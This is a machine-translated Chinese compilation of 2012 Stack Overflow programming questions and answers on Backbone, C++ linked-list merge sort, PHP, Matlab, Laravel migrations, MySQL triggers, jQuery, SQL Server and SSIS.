选择文本，按 Ctrl+Shift+H，确保在“查找范围”窗口中选择了“选择”。在“查找和替换”窗口打开时，您应该能够从代码窗口中选择您想要的任何内容，并且原始选择不应更改。复制要替换的内容并粘贴到“查找什么”窗口。使用要替换的文本设置“替换为”窗口，然后单击“全部替换”按钮。

# javascript - 按模型 ID 列表获取主干集合

> ID：13491523
> 
> 赞同：0
> 
> 时间：2012-11-21T10:45:33.067
> 
> 标签：javascript, rest, backbone.js

我有一个提供几个 URL 的 REST API：

```
/rest/messages 
```

提供所有消息。消息是 JSON/Backbone 模型

```
{ 
  title: 'foo',
  body : 'bar'
} 
```

要获得一条消息，我有：

```
/rest/messages/:id 
```

是否可以使用消息 ID 数组获取主干集合？我不想要整个消息列表，而只想要我按 ID 指定的几条消息。

我可以一个接一个地获取模型并填充集合，但我想知道 Backbone 是否有更清洁的方法来做到这一点。谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:33:30.300

根据[文档](http://backbonejs.org/#Collection-fetch)，您可以将`ajax`选项传递给`fetch`调用。因此，您可以将`ids`属性传递`data`给正在完成的 fetch 调用，并基于它从服务器返回相应的模型。

例如（在进行获取时），

```
collection.fetch({
  data : {
    message_ids : [1, 3, 5] // array of the message ids you want to retrieve as models
  }
}) 
```

该`message_id`数组将`parameters`在正在执行的服务器代码中作为（不确定您的情况下的名称）访问`/rest/messages`，从那里您可以根据您收到的 id 仅返回特定模型`message_ids`。您唯一需要的是，客户端必须知道它需要的所有消息模型的 ID。

您可以使用任何数据结构而不是数组来发送 message_ids。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T13:37:29.923

集合的 url 属性引用服务器上的集合位置。当您使用 fetch 时，主干使用该 url。
url 属性也可以是返回 url 的函数。所以你可以做这样的事情：

```
var ids = [1,2,3]
var messages = new MessegecCollection();
messages.url = function() {
    return "/rest/messages/"+ids.join("-"); //results "/rest/messages/1-2-3"
}
messages.fetch(); 
```

您还可以在您的集合中创建一个方法来生成和设置 url，甚至获取一组模型。
现在你所要做的就是支持这个网址：/rest/messages/1-2-3

希望这可以帮助！

# c++ - 为什么这个合并排序函数返回带零的链表（c++）？

> ID：13491529
> 
> 赞同：1
> 
> 时间：2012-11-21T10:45:46.557
> 
> 标签：c++, linked-list, mergesort

我有这个合并排序功能

```
namespace sorted{

    template<typename T>
    class list {

        /* other stuff */

        list<T>* slice(int from, int to){
            from = (from < 0) ? 0 : from;
            to = (to > this->len) ? this->len : to;
            list<T>* result = new list<T>();
            node<T> *n = this->head;
            int idx = 0;
            while (n && (idx < this->len)){
                if ((from <= idx) && (idx <= to)) result->append(n->value);
                if (idx > to) break;
                n = n->next;
                idx++;
            }
            return result;
        }            
    }

    template<typename T>
    list<T>* merge(list<T>* left, list<T>* right){
        list<T>* result = new list<T>();
        while ((left->length() > 0) || (right->length() > 0)){
            if ((left->length() > 0) && (right->length() > 0)){
                T l = left->get(0);
                T r = right->get(0);
                if (l <= r){
                    result->append(l);
                    left->remove(0);
                } else{
                    result->append(r);
                    right->remove(0);
                }
                continue;
            }

            if (left->length() > 0) {
                result->append(left->get(0));
                left->remove(0);
            }

            if (right->length() > 0) {
                result->append(right->get(0));
                right->remove(0);
            }
        }
        return result;
    }

    template<typename T>
    list<T>* merge_sort(list<T>* original){
        if (original->length() <= 1) {
            return original;
        }
        int len = original->length();
        list<T>* left = NULL;
        list<T>* right = NULL;
        if (len > 2){
            left = original->slice(0,(len/2));
            right = original->slice((len/2)+1,len-1);
        }else if (len == 2){
            left = original->slice(0,0);
            right = original->slice(1,1);
        }
        left = merge_sort(left);
        right = merge_sort(right);
        delete original;
        list<T>* result = merge(left, right);
        delete left;
        delete right;
        return result;
    }

    /* other stuff */    
} 
```

这是我的主要方法

```
int main(int argc, char** argv){
    sorted::list<int>* l = get_random_list();
    l = merge_sort(l);
    for (int i = 0; i < (l->length() - 1); i++){
        int t = l->get(i);
        int u = l->get(i+1); 
        if (t > u){
            sorted::list<int>* m = l->slice(i - 5, i + 5);
            cout << m << endl;
            delete m;
            break;
        }
    }
    delete l;
    return 0;
} 
```

链接到[bitbucket.org 项目](https://bitbucket.org/bitcycle/sorted-in-cpp)

我的问题*是*这个。

如果列表从切片函数正确返回，为什么它不能正确返回到主函数，如果它以相同的方式完成？

**[更新]**添加了功能，因为它们目前正在以应有的方式运行。完整版本已在 bitbucket 上发布。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:59:50.587

检查您提供的链接中的完整代码后，我可以肯定地说问题是因为您没有赋值运算符。

现在发生的是列表的赋值将使用编译器自动生成的默认赋值运算符。这会进行*浅*拷贝，因此赋值左侧的列表的指针与右侧列表的指针相同。这意味着当您返回的局部变量超出范围时，它当然会调用删除列表的析构函数。现在副本有指向已删除内存的指针，访问这些指针是未定义的行为。这就是为什么它似乎在一个地方而不是另一个地方工作。

# objective-c - 只调用方法的一部分

> ID：13491532
> 
> 赞同：0
> 
> 时间：2012-11-21T10:45:52.560
> 
> 标签：objective-c, cocoa, overloading

如果我有一个方法叫做

```
-(void) changeButton:(UIButton *)button andAlpha:(float)alpha andEnabled:(BOOL)enabled {
    button.alpha = alpha;
    button.enabled = enabled;    
} 
```

无论如何我只能调用`[self changeButton:buttonName andAlpha:0.5];`并错过`andEnabled(BOOL)`启用，以便它保持相同的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:48:54.110

不，仅当您声明其他方法时。

像

```
-(void) changeButton:(UIButton *)button andAlpha:(float)alpha {
    [self changeButton:button andAlpha:alpha andEnabled:button.enabled]; 
}

-(void) changeButton:(UIButton *)button andAlpha:(float)alpha andEnabled:(BOOL)enabled {
    button.alpha = alpha;
    button.enabled = enabled;    
} 
```

但请记住，这种方法并不总是好的。例如，**启用的**属性可以由一些自定义设置器备份，即使您不想更改该值，也会调用该设置器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:54:10.427

你不能这样做，你必须声明另一个方法。

```
-(void) changeButton:(UIButton *)button andAlpha:(float)alpha; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:30:20.710

我确定您在询问 c++ 的默认参数化函数。

但是 Objective-C 不支持这一点。

您可以创建 2 种方法：

```
-(void) changeButton:(UIButton *)button andAlpha:(float)alpha {
    button.alpha = alpha; 
}

-(void) changeButton:(UIButton *)button andAlpha:(float)alpha andEnabled:(BOOL)enabled {
    button.alpha = alpha;
    button.enabled = enabled;    
} 
```

对于 C ：使用 ObjC 对 C 子集没有什么特别的添加。在纯 C 中无法完成的任何事情也无法通过在 ObjC 中编译来完成。这意味着，您不能有默认参数，也不能重载函数。改为创建 2 个函数。

另一种方法（有点冗长，因为很少有人使用）是有一个标志并检查标志是/否。

```
 -(void) changeButton:(UIButton *)button andAlpha:(float)alpha andEnabled:(BOOL)enabled withFlag:(BOOL)flag{
    button.alpha = alpha;
    if(flag){        
        button.enabled = enabled;    
    }
} 
```

# php - 使用 php 从名称“sample”开始检查文件是否存在

> ID：13491534
> 
> 赞同：1
> 
> 时间：2012-11-21T10:45:55.170
> 
> 标签：php

有人可以帮助我如何使用 PHP 在特定文件夹中`sample1.pdf`检查以任何名称开头的文件的存在吗？`sample12.pdf`下面是我检查单个文件的代码。

```
<html>
<?php
if(file_exists("properties/".$owner."/".$property."/sample1.pdf") )
?>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:50:34.000

PHP 函数 glob（[此处](http://php.net/manual/en/function.glob.php)）将为您提供匹配的文件数组。因此，您可以执行以下操作：

```
$files = glob("properties/{$owner}/{$property}/sample*.pdf"); 
```

然后，这将返回 "properties/{$owner}/{$property}/" 目录中以 "sample" 开头并具有 .pdf 扩展名的文件数组

然后，您可以遍历文件并执行您需要的操作

```
//Check if there are any files and there were not any FATAL errors
if (count($files) > 0 && $files !== FALSE) {
    foreach ($files as $file) {
        //Do something here
    }
} else {
    //There were no matching files
} 
```

希望这可以帮助

# matlab - 如何在 Matlab 中进行这种矩阵除法？

> ID：13491535
> 
> 赞同：2
> 
> 时间：2012-11-21T10:45:55.963
> 
> 标签：matlab, linear-algebra

这个问题可能与 Matlab 的关系不大，而与矩阵代数有关（我在大学课程中大多忘记了）。假设我有一个`m x n`矩阵`X`和一个`m x 1`矩阵`B`。我将如何除以使得`X`X的第 th 行的`B`所有元素`i`都被 B 的第 th 行分段除以`i`产生另一个`m x n`矩阵`Y`？

例如

```
X = [2 4 8; 3 9 27; 4 16 64]
B = [2; 3; 4]

X ? B = [2/2 4/2 8/2; 3/3 9/3 27/3; 4/4 16/4 64/4]
ans   = 
           1     2     4
           1     3     9
           1     4    16 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-21T11:12:48.767

最好不要使用`repmat`- 它很慢并且为工作区分配了额外的内存。您可以使用`bsxfun`，这是一个内置函数，因此它更快并且避免了额外的工作空间：

```
X = [2 4 8; 3 9 27; 4 16 64]
B = [2; 3; 4]
bsxfun(@rdivide, X, B)

ans =

 1     2     4
 1     3     9
 1     4    16 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:59:18.310

Junuxx 的评论为我指明了正确的方向。我用来得到我想要的解决方案是：

```
B_prime = repmat(B,1,3)

X ./ B_prime

ans =

 1     2     4
 1     3     9
 1     4    16 
```

我仍然想知道这种操作叫什么（如果它甚至有正式名称）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:19:33.860

X 是`m x n`，B 是`m x 1`

`size(X,2)`给出 n 的值，即列数

所以，你需要这样做：

```
X./repmat(B,1,size(X,2)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T16:20:50.810

X = [2 4 8; 3 9 27；4 16 64]

B = [2; 3；4]

结果= X./ **B(:,ones(1,3))** % 比 repmat 快

结果 =

```
 1     2     4
 1     3     9
 1     4    16 
```

# php - 如何在 laravel 中为特定环境运行迁移

> ID：13491536
> 
> 赞同：24
> 
> 时间：2012-11-21T10:45:57.400
> 
> 标签：php, laravel

我正在使用 laravel (Laravel 4) 设置一个新应用程序，并且在通过迁移设置数据库时遇到了一些问题。

我制作了一个迁移文件：

```
artisan migrate:make --table="jobs" --create jobs 
```

它按预期在数据库/迁移中创建了一个文件，我对此做了一些修改，然后使用

```
artisan migrate --env=local 
```

但我得到了答复`"Nothing to migrate"`

如果我尝试在没有 的情况下运行`--env=local`，它会使用我们不想使用的配置文件夹（而不是本地/暂存/生产文件夹）中的 database.php，因为它不是特定于环境的。

我的第一个想法是好的，也许我需要在`migrate:make`调用上加上 env 标志，所以我尝试了，但得到一个错误，说它无法创建迁移文件。然后我认为无论如何进行基于 env 的迁移是没有意义的……它们应该是通用的，并且只是在每个 env 的基础上运行，所以最后，所有环境都使用相同的迁移脚本。

所以我现在有点不知道从这里去哪里

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-11-21T10:52:21.053

您需要在 migrate 命令之前指定环境。

```
artisan --env=local migrate 
```

运行`artisan help`向您显示命令遵循的格式。

```
artisan help

Usage:
  [options] command [arguments] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-07-17T13:39:58.490

我想出了一个`migrate`针对不同数据库运行的解决方案。基本上，该命令`artisan migrate --env=local`不起作用。但是我们可以在`config\database.php`. 例如：

```
<?php
   'mysql_testing' => [
        'driver'    => 'mysql',
        'host'      => env('DB_TESTING_HOST'),
        'database'  => env('DB_TESTING_DATABASE'),
        'username'  => env('DB_TESTING_USERNAME'),
        'password'  => env('DB_TESTING_PASSWORD'),
        'charset'   => 'utf8',
        'collation' => 'utf8_unicode_ci',
        'prefix'    => 'prefix_',
    ], 
```

并指定`--database`我们`artisan migrate`像这样运行的时间：

```
php artisan migrate --database=mysql_testing 
```

希望这可以帮助 ：）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-21T11:51:41.353

解决。

解决方案是简单地编辑 local/database.php（或 production/database.php 等），确保迁移路径变量指向`migrate:make`创建迁移文件的位置，只需更改

```
'application' => __DIR__.'/../database/migrations', 
```

至

```
'application' => DIR.'/../../database/migrations', 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:54:15.247

如果在运行迁移后修改迁移，首先需要回滚迁移。

```
php artisan migrate:rollback 
```

继续运行，直到您更改的迁移被回滚。或者，您可以使用重置整个架构

```
php artisan migrate:reset 
```

但是你需要像往常一样调用你的迁移来更新它们。

```
php artisan migrate 
```

最后，您可以通过调用重置然后迁移

```
php artisan rebuild 
```

另请注意，在迁移完成后修改迁移通常是一种不好的做法，除非您真的只是做了它。部署后，您不应修改它，而是创建一个新的迁移文件。

希望这可以帮助。

编辑：我不知何故错过了 Laravel 4 指标。我相信这些命令中的大多数仍然有效，但您可能需要调整。

# jquery - 我应该什么时候进行延迟加载，这将如何影响谷歌搜索结果？

> ID：13491537
> 
> 赞同：3
> 
> 时间：2012-11-21T10:46:03.527
> 
> 标签：jquery, lazy-loading, responsive-design

我正在考虑深入研究“响应式网页设计的渐进增强学校”，并且正在研究延迟加载以增加移动设备和包含大量内容的网页的页面加载时间。

我一直在阅读，虽然延迟加载听起来不错，但它可以过度使用吗？什么时候不应该使用延迟加载？

此外，如果在我向下滚动之前未加载内容，这将如何影响我将`jQuery`用来获取内容的 Google 搜索引擎？（假设我有一个站点地图）

**更新**
我只是有一个想法。
如果我有一个好的站点地图并且我在 Google 中索引我的页面，延迟加载不应该影响 google 搜索结果，因为内容已经被索引（在大多数情况下）。

我对吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:59:37.120

每当你必须在前端显示一堆数据和图像时，你应该使用延迟加载，它会帮助你在 UI 线程上显示所有文本信息，并且图像会在另一个线程上下载，它不会影响你的 UI 线程。连同您的文本信息，它将显示所有将下载到您的系统上的图像。

根据您的问题，它不会影响 Google 搜索，图片不会阻止任何内容，它们已经被延迟加载。on load 事件通知您所有内容都已下载，包括图像，但这是在文档准备好之后很久。

请检查此链接。

[延迟加载 img src 对 SEO 产生负面影响](https://stackoverflow.com/questions/5440998/would-lazy-loading-img-src-negatively-impact-seo)

# salesforce - Salesforce：创建自定义对象和字段的脚本

> ID：13491541
> 
> 赞同：6
> 
> 时间：2012-11-21T10:46:15.560
> 
> 标签：salesforce

有没有办法通过使用脚本或 IDE 创建自定义对象和字段？

Salesforce 非常易于使用，但是在 Web 界面上创建如此多的字段非常耗时。所以，只是想知道是否有办法使用脚本或 IDE 在 Salesforce 中创建对象和字段？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-21T14:12:17.447

您正在寻找元数据 API，或已开发的使用元数据 API 的工具。

[http://www.salesforce.com/us/developer/docs/api_meta/Content/meta_intro.htm](http://www.salesforce.com/us/developer/docs/api_meta/Content/meta_intro.htm) http://www.salesforce.com/us/developer/docs/api_meta/index.htm

虽然直接使用它仍然需要一些开发，这可能不会为您节省太多时间。您在 XML 中获得元数据，但仍需要将其处理为您想要实现的目标。

在某种程度上还取决于您想做的事情的性质。例如，我今天需要基于输入文件的 150 个自定义标签。生成元数据 XML 比在 Web 界面中生成元数据要快得多。使用 force.com IDE 部署元数据。

# asp.net-mvc-4 - MVC 4 - 异常助手

> ID：13491543
> 
> 赞同：1
> 
> 时间：2012-11-21T10:46:16.183
> 
> 标签：asp.net-mvc-4

在 mvc 4 中（但我认为在所有 mvc 版本中）我需要拦截 DbEntityValidationException。

在这个阶段，我需要在一个简单的日志中显示这个对象中的错误。

在捕获中，我有以下代码：

```
foreach (var eve in EventityValidationErrors)
   {
        foreach(var ve in eve.ValidationErros)
       {
         Console.Writeline(ve.PropertyName,ve.ErrorMessage)
       }
    } 
```

它非常有用。

现在，我的工作是尝试在视图中显示此异常信息（仅在开发阶段）。

有人知道是否有快速的方法吗？（理想情况下使用外部 nuget 组件）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:33:45.173

[Elmah](https://code.google.com/p/elmah/)有一个[nuget 包](http://nuget.org/packages/elmah)，并提供了一种快速显示详细错误的方法。

你需要稍微改变一下你的渔获。那就是捕获你的异常，创建一个新的异常，其中包含你的数据，然后抛出这个异常并让 Elmah 处理它。

```
catch(DbEntityValidationException dbEx)
{
   var sb = new StringBuilder();
   foreach (var eve in dbEx.EntityValidationErrors)
   {
        foreach(var ve in eve.ValidationErrors)
       {
         sb.Append(ve.PropertyName);
         sb.Append(ve.ErrorMessage); //format to your needs
       }
    }
  var detailedException = new Exception(sb.ToString(), dbEx)
} 
```

有很多关于如何设置 Elmah 来捕获所有未处理的 mvc 异常的文档。

# php - 带有 javascript 和 php 的弹出窗口

> ID：13491549
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:46:41.203
> 
> 标签：php, javascript, popup

我想通过 php 打开一个链接，但要使用一些 javascript 资源，否则我知道这是不可能的。

我已经有这个代码或函数：

```
<script language='JavaScript'>
        function open(URL) {

            var width = 150;
            var height = 250;

            var left = 99;
            var top = 99;

            window.open(URL,'janela', 'width='+width+', height='+height+', top='+top+', left='+left+', scrollbars=yes, status=no, toolbar=no, location=no, directories=no, menubar=no, resizable=no, fullscreen=no');

        }
    </script> 
```

在php中我有这个并且工作正常：

```
$inf=' | <a href="javascript:abrir(\'http://google.pt\');">+i</a>'; 
```

但不是静态网址[http://google.pt](http://google.pt)我想像这样放置一个 php 变量：

```
$inf=' | <a href="javascript:abrir(\'$VARIABLE');">+i</a>'; 
```

当然不起作用，我不知道如何将变量嵌入到该网址中，有什么帮助吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:58:29.760

采用

```
$inf=' | <a href="javascript:abrir(\''.$VARIABLE.'\');">+i</a>'; 
```

或者

```
$inf=" | <a href=\"javascript:abrir('$VARIABLE');\">+i</a>"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:50:29.733

代码将是：

```
$inf=' | <a href="javascript:abrir(\''.$variable.'\');">+i</a>'; 
```

如果变量来自某些外部源（如 url，....），那么请确保它不能用于代码注入（因此应该使用 htmlspecialchars，....）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:58:04.993

如果你想将 php 变量传递给 JavaScript 函数，那么可以这样完成：

```
$inf=' | <a href="javascript:abrir(\''.$VARIABLE.'\');">+i</a>'; 
```

您可能会注意到用于标记 php 字符串的单引号和`\'`用于标记 JavaScript 字符串的 JavaScript 函数的转义单引号 ( )。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:51:53.357

刚刚发现一些不同的东西可能会有所帮助=)

我与 pastebin 没有任何关系。

[数组实现](http://pastebin.com/M9W0Cc5g)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-21T10:50:51.447

要让 $variable 工作，您必须双引号字符串，并用 "\" 转义内部双引号，这样它就不会关闭您的字符串：

```
$inf=" | <a href=\"javascript:abrir('$VARIABLE');\">+i</a>"; 
```

或者您可以使用串联：

```
$inf=' | <a href="javascript:abrir(\''.$VARIABLE.'\');">+i</a>'; 
```

# mysql - 使用 MySql 在当前表中插入时触发更新另一个表？

> ID：13491550
> 
> 赞同：0
> 
> 时间：2012-11-21T10:46:41.527
> 
> 标签：mysql, triggers

我不擅长数据库中的触发器

扳机：

```
delimiter $$

    CREATE
    DEFINER=`root`@`localhost`
    TRIGGER `bon_apetite`.`orders_insert_update_trigger`
    AFTER INSERT ON `bon_apetite`.`orders`
    FOR EACH ROW
    BEGIN
    update budget_tracking set new.monthly_balance = old.monthly_balance + new.total_price
    where tracking_userid = new.order_userid;
    END
    $$ 
```

表：

预算跟踪和订单

列：

budget_tracking（id、budget_userid、monthly_balance、created_date、modified_date）

订单（order_id，order_userid，total_price，created_date，modified_date）

budget_userid 和 order_userid 是另一个表中主键的外键。

我想要的只是当我向订单表插入值时，触发器应该更新budget_tracking 表的monthly_balance 字段以及两个表的created_date 和modified_date。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:54:31.063

试试这个

```
BEGIN
update budget_tracking set monthly_balance = monthly_balance + new.total_price
where tracking_userid = new.order_userid;
END 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:54:36.510

试试这个：

```
DELIMITER $$

CREATE DEFINER=`root`@`localhost` TRIGGER `bon_apetite`.`orders_insert_update_trigger` AFTER INSERT ON `bon_apetite`.`orders` FOR EACH ROW
BEGIN
UPDATE budget_tracking SET monthly_balance = monthly_balance + new.total_price
WHERE tracking_userid = new.order_userid;
END$$

DELIMITER ; 
```

# jquery - 缩小屏幕尺寸时更改 div 的父级

> ID：13491552
> 
> 赞同：3
> 
> 时间：2012-11-21T10:46:46.520
> 
> 标签：jquery, css, layout

当屏幕尺寸减小时，我正在尝试更改孩子所附加的父 div。
这是我的代码：

### HTML：

```
<div id="menu">Menu 1</div>
<div id="testing">Testing 1</div>
<div id="boxed">
    <div id="box-01" class="boxes"></div>
    <div id="box-02" class="boxes"></div>
    <div id="box-03" class="boxes"></div>
    <div id="box-04" class="boxes">
        <div id="menu-right">Menu 2</div>
    </div>
    <div id="box-05" class="boxes"></div>
    <div id="box-06" class="boxes"></div>
    <div id="box-07" class="boxes"></div>
    <div id="box-08" class="boxes"></div>
</div> 
```

### CSS：

```
#menu {
    font-family: Helvetica, Arial, sans-serif;
    font-weight: bold;
    font-size: 14px;
    left: 20px;
    top: 10px;
    position: absolute;
}

#menu-right {
    font-family: Helvetica, Arial, sans-serif;
    font-weight: bold;
    font-size: 14px;
    width: 100px;
    position: absolute;
    top: -50px;
}

#testing {
    font-family: Georgia, Arial, sans-serif;
    font-size: 14px;
    left: 20px;
    top: 30px;
    position: absolute;
}

.boxes {
    background-color: red;
    height: 100px;
    width: 100px;
    margin-right: 8px;
    margin-bottom: 8px;
    display: block;
    float: left;
    position:relative;
}

#boxed {
    position: absolute;
    left: 20px;
    margin-right: 12px;
    top: 64px;
    width: auto;
    float: left;
    z-index: 9998;
} 
```

我还有一个 jsFiddle 来演示： http: [//jsfiddle.net/L2Deq/20/](http://jsfiddle.net/L2Deq/20/)

所以“menu-right”目前是“box-04”的孩子，当框 4 位于右上角时，但是当屏幕尺寸减小时，菜单也会下拉。我试图弄清楚当屏幕尺寸减小时是否可以更改孩子连接到哪个父级，因此当框 4 下降时，它将连接到框 3，依此类推。所以菜单总是附在右上角的框上。
或者也许有一种更简单的方法可以实现这一点，似乎无法弄清楚。
希望这是有道理的，我仍然是初学者。​</p>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T11:10:50.220

**在调整大小时获取#boxed**的宽度，计算一行中有多少**个.boxes**（#boxed 宽度/.boxes 宽度）并将**#menu-right**附加到该框。

使用例如：

```
.resize() 
```

[调整大小（）](http://api.jquery.com/resize/)

```
appendTo() 
```

[追加到（）](http://docs.jquery.com/Manipulation/appendTo)

# jquery - 在许多具有相同类的下拉列表中查找选定的选项

> ID：13491553
> 
> 赞同：1
> 
> 时间：2012-11-21T10:46:50.903
> 
> 标签：jquery, jquery-selectors

html是

```
<select class='pay-type' style='width:100%'>
  <option>Credit Card</option>
  <option>Cash</option>
  <option>Credit Note</option>
  option>Gift Voucher</option>
  <option>Cheque</option>
</select> 
```

我通过将相同的 html 插入新的 div 来重现此选择。我编写了一个模块，该模块在下拉列表中的选择更改时触发。如何在 onclick 函数中获取确切下拉列表的选定值？以下代码似乎不起作用。

```
$('.pay-type').change(function(){
  console.log($(this).filter('option :selected'));
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:49:18.500

你错过了一个`.text()`

```
$('.pay-type').change(function(){
    console.log($(this).filter('option :selected').text()); // to show the text
    console.log($(this).val()); // to show the value
}); 
```

注意：您的代码中存在一些问题。

1.  选项没有值。虽然不是绝对必要的，但拥有它们是一种很好的做法。如果您想将值存储在数据库中，您现在必须`text`仅使用该方法进行存储。
2.  如果您将第一个保留`option`为*Select a payment method*，则用户还可以选择*Credit card*选项以显示在所选 div 中。现在要做同样的事情，用户必须先选择其他东西，然后返回并选择该选项以查看它

# sql-server - 如何在 SQL Server 2012 中删除表列？

> ID：13491554
> 
> 赞同：3
> 
> 时间：2012-11-21T10:46:49.833
> 
> 标签：sql-server, sql-server-2012

我希望在 SQL Server 2012 中删除一个表列，而不影响表中的其他列（及其数据）。

我怎样才能做到这一点？有可能吗？

到目前为止，我已经尝试通过 SQL Server Management Studio 删除该列，但这表示必须删除并重新创建整个表。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-21T10:49:49.570

来自[MSDN](http://msdn.microsoft.com/en-us/library/ms175491.aspx)

`ALTER TABLE dbo.Table DROP COLUMN column_b`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:52:28.370

删除列

```
alter table tblname drop column colname 
```

添加列

```
alter table tblname add colname datatype 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:50:13.833

```
ALTER TABLE table_name
DROP COLUMN column_name 
```

# javascript - Javascript数组 - 将两个数组合并为一个

> ID：13491555
> 
> 赞同：2
> 
> 时间：2012-11-21T10:46:51.853
> 
> 标签：javascript, jquery, arrays

我有两个数组，一个是国家名称，一个是货币类型。我想将这些合并在一起并使用国家/地区键而不是货币数组。实现这一目标的最佳方法是什么？

**这就是我的代码现在的样子：**

```
var country = new Array();
country["SEK"] = 'Sweden';
country["USD"] = 'United states';
var currencies = ["SEK","USD"];
var options = '';

for (var i = 0; i < currencies.length; i++) {
    options += '<option value="' + currencies[i] + '" id="' + currencies[i] + '">' + currencies[i] + ' (' + country[currencies[i]] + ')</option>';
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:54:44.637

这是一个常见的误解，您可以只使用它：

```
for (var currency in country) {
  result += { ... something done with both currency and country[currency] ... };
} 
```

这里的问题是哈希在 JS 中在技术上是无序的，因此您不能保证这些选项的顺序相同。

常见的替代方法是使用对象数组：

```
var countriesData = [
{
  country: 'Sweden',
  currency: 'SEK'
},
{
  country: 'United States',
  currency: 'USD'
}
];
for (var i = 0, l = countriesData.length; i < l; i++) {
  result += { something of countriesData[i].currency and countriesData[i].country };
} 
```

* * *

作为旁注，考虑一下这个......

```
var country = new Array();
country["SEK"] = 'Sweden';
country["USD"] = 'United states';
console.log(country.length); // wait, what? 
```

... 并且 0 将被记录，而不是 2 - 正如预期的那样。同样，在 JS 中没有“类似 PHP 的关联数组”之类的东西：有对象和数组（从技术上讲，它们也是对象；`typeof country`会给你 'object' 字符串）。

所以这就是这里发生的事情：你创建了一个`Array`对象，它继承了`Array.prototype`（例如`length`）的所有属性，特别是。现在你用两个属性扩展这个数组 - 'SEK' 和 'USD'; 但这与使用`push`或某些类似方法将这些字符串推入数组不同！这就是为什么它`length`保持不变，引入混乱和混乱。)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:50:47.990

尝试这个：

```
var countries = {
    'Sweden': 'SEK',
    'United Stated': 'USD'
}, options = '', country;

for(country in countries) {
    options += '<option value="' + countries[country] + '" id="' + countries[country] + '">' + countries[country] + ' (' + country + ')</option>';
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T11:44:07.720

使用数组似乎不舒服。请改用 json object ^([json.org](http://www.json.org/)) ^([wikipedia](http://en.wikipedia.org/wiki/JSON))，这样您就可以利用关系键值。此外，您还可以使用[lint](http://jsonlint.com/)对其进行验证。不需要 jQuery。所以这是代码：

```
var currency = {
    "SEK": "Sweden",
    "USD": "United states",
    "GBP": "United Kingdom"
};

(function(obj) {
    var myselect = document.getElementById("currency");
    for (var key in obj) {
        var optElement = new Option( key+ " ( " + obj[key] + " ) ", key );
        optElement.id = key; //optElement.setAttribute ( "id", key);
        myselect.add ( optElement, null);
    }
})(currency); 
```

​至于函数 - 我认为最好用对象来做，而不是制作一个字符串然后将其添加到选择中。它是一个匿名函数，因此它是独立的，不会干扰任何其他代码。只需在创建选择后使用它，或将其放在页面末尾。

和[jsfiddle 的例子](http://jsfiddle.net/zHLDM/)

编辑：

使用 add() 或 innerHTML - 在 Chrome 中，innerHTML 不起作用。这种方式更好。

至于删除选项 - 有`remove()`方法。使用其中之一：

```
var x = document.getElementById("currency");
for ( var i = x.length; i > 0; i-- ) { x.remove ( 0 ); } 
```

或者

```
while ( x.length > 0 )               { x.remove ( x.length - 1 ); } 
```

# ssis - SSIS 数据流 - 具有所需外键值的顺序插入

> ID：13491557
> 
> 赞同：2
> 
> 时间：2012-11-21T10:46:59.333
> 
> 标签：ssis, dataflow

是否可以插入初始表，然后使用插入的 ID 插入到在一个数据流中的列之间具有外键约束的主表？

我是集成服务的新手，不了解这些功能

设想：

表 A - ID - DESC

表 B - ID - A_ID - DESC

这是 A_ID 是外键的地方（如果它不明显）

我可以使用这种顺序事件流创建单个数据流，还是在插入表 A 后需要创建另一个数据流以插入表 B。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T17:56:38.427

数据流中没有优先约束或容器，因此如果您将两个操作放在一个流中，它们会并行执行，这意味着您无法确保它们会按必要的顺序完成。所以只需使用两个数据流，然后您就可以控制控制流中的顺序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T17:56:46.787

在一个数据流任务中，您可以有不同的“通道”和不同的导入。这些可以通过使用合并任务进行合并，您可以使用您的 ID 加入。通常，每个“通道”包含一个数据流，代表一个表。

![在此处输入图像描述](../Images/6a23192cb0464db3237bbd3ebea113f7.png)

图片来源：[http ://sqlserverpedia.com/w/images/5/56/CWebb-Dataflow.png](http://sqlserverpedia.com/w/images/5/56/CWebb-Dataflow.png)

